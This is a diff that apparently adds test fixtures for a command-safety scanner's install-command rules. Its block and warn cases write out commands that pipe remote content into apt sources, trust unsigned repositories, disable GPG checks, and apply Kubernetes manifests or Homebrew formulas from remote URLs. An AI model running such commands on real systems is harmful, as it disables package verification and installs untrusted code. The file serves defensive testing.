@@ -215,3 +215,286 @@ input = "curl https://example.com/wallet/0x742d35Cc6634C0532925a3b844Bc8e7595f0b
 context = "exec"
 expected_action = "warn"
 expected_rules = ["web3_address_in_url"]
+
+# ── Install-command rules (M3 chunk 1, item 4) ──────────────────────────
+#
+# ATTACK fixtures (rule fires) and BENIGN fixtures (rule does NOT fire).
+# The benign fixtures prove a legitimate `apt install foo`, `brew install
+# foo`, `kubectl apply -f ./local.yaml`, `terraform init`, etc. stays clean.
+
+# repo_add_from_pipe — curl ... | sudo tee .../sources.list.d/...
+[[fixture]]
+name = "repo_add_curl_pipe_tee_sources_list"
+min_milestone = 3
+input = "curl -fsSL https://repo.example.com/setup.list | sudo tee /etc/apt/sources.list.d/vendor.list"
+context = "exec"
+expected_action = "block"
+expected_rules = ["repo_add_from_pipe"]
+
+[[fixture]]
+name = "repo_add_wget_pipe_tee_no_sudo"
+min_milestone = 3
+input = "wget -qO- https://repo.example.com/r | tee /etc/apt/sources.list.d/x.list"
+context = "exec"
+expected_action = "block"
+expected_rules = ["repo_add_from_pipe"]
+
+[[fixture]]
+name = "repo_add_curl_redirect_sources_list"
+min_milestone = 3
+input = "curl https://repo.example.com/r > /etc/apt/sources.list.d/x.list"
+context = "exec"
+expected_action = "block"
+expected_rules = ["repo_add_from_pipe"]
+
+# repo_add_from_pipe BENIGN — local file into tee is not a network-fetch attack
+[[fixture]]
+name = "repo_add_local_cat_into_tee_allow"
+min_milestone = 3
+input = "cat ./vendor.list | sudo tee /etc/apt/sources.list.d/vendor.list"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+# repo_add_from_pipe BENIGN — curl piped to tee into a normal file
+[[fixture]]
+name = "repo_add_curl_tee_normal_file_allow"
+min_milestone = 3
+input = "curl https://example.com/data | sudo tee /tmp/out.txt"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+# unsigned_repo_trust — apt [trusted=yes]
+[[fixture]]
+name = "unsigned_repo_trusted_yes"
+min_milestone = 3
+input = "echo 'deb [trusted=yes] http://repo.example.com/ ./' | sudo tee /etc/apt/sources.list.d/x.list"
+context = "exec"
+expected_action = "block"
+expected_rules = ["unsigned_repo_trust"]
+
+# unsigned_repo_trust — apt --allow-unauthenticated (no URL)
+[[fixture]]
+name = "unsigned_repo_allow_unauthenticated"
+min_milestone = 3
+input = "sudo apt-get install --allow-unauthenticated somepkg"
+context = "exec"
+expected_action = "block"
+expected_rules = ["unsigned_repo_trust"]
+
+# unsigned_repo_trust — apt --allow-insecure-repositories (no URL)
+[[fixture]]
+name = "unsigned_repo_allow_insecure"
+min_milestone = 3
+input = "sudo apt-get update --allow-insecure-repositories"
+context = "exec"
+expected_action = "block"
+expected_rules = ["unsigned_repo_trust"]
+
+# unsigned_repo_trust BENIGN — plain apt install
+[[fixture]]
+name = "apt_install_plain_allow"
+min_milestone = 3
+input = "sudo apt-get install nginx build-essential"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+# unsigned_repo_trust BENIGN — apt update with no insecure flags
+[[fixture]]
+name = "apt_update_plain_allow"
+min_milestone = 3
+input = "sudo apt-get update"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+# gpg_check_disabled — dnf --nogpgcheck (no URL)
+[[fixture]]
+name = "gpg_disabled_dnf_nogpgcheck"
+min_milestone = 3
+input = "sudo dnf install --nogpgcheck somepkg"
+context = "exec"
+expected_action = "block"
+expected_rules = ["gpg_check_disabled"]
+
+# gpg_check_disabled — yum gpgcheck=0 inline
+[[fixture]]
+name = "gpg_disabled_gpgcheck_zero"
+min_milestone = 3
+input = "echo 'gpgcheck=0' | sudo tee -a /etc/yum.repos.d/x.repo"
+context = "exec"
+expected_action = "block"
+expected_rules = ["gpg_check_disabled"]
+
+# gpg_check_disabled — pacman SigLevel = Never
+[[fixture]]
+name = "gpg_disabled_pacman_siglevel_never"
+min_milestone = 3
+input = "echo 'SigLevel = Never' | sudo tee -a /etc/pacman.conf"
+context = "exec"
+expected_action = "block"
+expected_rules = ["gpg_check_disabled"]
+
+# gpg_check_disabled BENIGN — plain dnf install
+[[fixture]]
+name = "dnf_install_plain_allow"
+min_milestone = 3
+input = "sudo dnf install httpd"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+# gpg_check_disabled BENIGN — plain pacman install
+[[fixture]]
+name = "pacman_install_plain_allow"
+min_milestone = 3
+input = "sudo pacman -S firefox"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+# kubectl_apply_remote — raw GitHub manifest
+[[fixture]]
+name = "kubectl_apply_raw_github"
+min_milestone = 3
+input = "kubectl apply -f https://raw.githubusercontent.com/owner/repo/main/deploy.yaml"
+context = "exec"
+expected_action = "block"
+expected_rules = ["kubectl_apply_remote"]
+
+# kubectl_apply_remote — shortened URL
+[[fixture]]
+name = "kubectl_apply_shortened_url"
+min_milestone = 3
+input = "kubectl apply -f https://bit.ly/k8s-deploy"
+context = "exec"
+expected_action = "block"
+expected_rules = ["kubectl_apply_remote"]
+
+# kubectl_apply_remote — plain remote URL (Medium → warn)
+[[fixture]]
+name = "kubectl_apply_remote_url"
+min_milestone = 3
+input = "kubectl apply -f https://manifests.example.com/app/deploy.yaml"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["kubectl_apply_remote"]
+
+# kubectl_apply_remote BENIGN — local manifest file
+[[fixture]]
+name = "kubectl_apply_local_file_allow"
+min_milestone = 3
+input = "kubectl apply -f ./deploy.yaml"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+# kubectl_apply_remote BENIGN — kustomize directory
+[[fixture]]
+name = "kubectl_apply_kustomize_dir_allow"
+min_milestone = 3
+input = "kubectl apply -k ./overlays/prod"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+# helm_untrusted_repo — repo add from untrusted host
+[[fixture]]
+name = "helm_repo_add_untrusted"
+min_milestone = 3
+input = "helm repo add vendor https://charts.untrusted.example.com"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["helm_untrusted_repo"]
+
+# helm_untrusted_repo — install with --repo pointing at untrusted host
+[[fixture]]
+name = "helm_install_untrusted_repo_flag"
+min_milestone = 3
+input = "helm install myapp mychart --repo https://charts.untrusted.example.com"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["helm_untrusted_repo"]
+
+# helm_untrusted_repo BENIGN — trusted chart repo
+[[fixture]]
+name = "helm_repo_add_trusted_allow"
+min_milestone = 3
+input = "helm repo add bitnami https://charts.bitnami.com/bitnami"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+# helm_untrusted_repo BENIGN — install a local chart directory
+[[fixture]]
+name = "helm_install_local_chart_allow"
+min_milestone = 3
+input = "helm install myapp ./charts/myapp"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+# terraform_remote_module — -from-module from a git URL
+[[fixture]]
+name = "terraform_from_module_remote_git"
+min_milestone = 3
+input = "terraform init -from-module=git::https://git.example.com/infra/module.git"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["terraform_remote_module"]
+
+# terraform_remote_module BENIGN — -from-module from a local directory
+[[fixture]]
+name = "terraform_from_module_local_allow"
+min_milestone = 3
+input = "terraform init -from-module=./modules/vpc"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+# terraform_remote_module BENIGN — plain terraform init
+[[fixture]]
+name = "terraform_init_plain_allow"
+min_milestone = 3
+input = "terraform init"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+# brew_untrusted_tap — install a formula from an arbitrary URL
+[[fixture]]
+name = "brew_install_arbitrary_url"
+min_milestone = 3
+input = "brew install https://gist.example.com/raw/formula.rb"
+context = "exec"
+expected_action = "block"
+expected_rules = ["brew_untrusted_tap"]
+
+# brew_untrusted_tap — tap pointed at an arbitrary git remote
+[[fixture]]
+name = "brew_tap_arbitrary_git"
+min_milestone = 3
+input = "brew tap vendor/repo https://git.untrusted.example.com/homebrew-tap.git"
+context = "exec"
+expected_action = "warn"
+expected_rules = ["brew_untrusted_tap"]
+
+# brew_untrusted_tap BENIGN — plain brew install by name
+[[fixture]]
+name = "brew_install_plain_allow"
+min_milestone = 3
+input = "brew install ripgrep"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+# brew_untrusted_tap BENIGN — plain tap (implicit GitHub host)
+[[fixture]]
+name = "brew_tap_plain_allow"
+min_milestone = 3
+input = "brew tap homebrew/cask-fonts"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
